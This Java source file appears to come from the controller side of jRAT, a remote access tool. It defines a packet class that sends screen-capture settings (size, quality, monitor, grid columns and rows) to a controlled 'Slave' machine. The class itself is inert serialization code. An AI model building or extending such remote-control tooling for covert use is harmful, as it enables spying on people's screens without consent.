package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet12RemoteScreen extends AbstractOutgoingPacket {

	private int size;
	private int quality;
	private int monitor;
	private int columns;
	private int rows;

	public Packet12RemoteScreen(int size, int quality, int monitor, int columns, int rows) {
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
		this.columns = columns;
		this.rows = rows;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(size);
		dos.writeInt(quality);
		dos.writeInt(monitor);
		dos.writeInt(columns);
		dos.writeInt(rows);
	}

	@Override
	public short getPacketId() {
		return 12;
	}

}
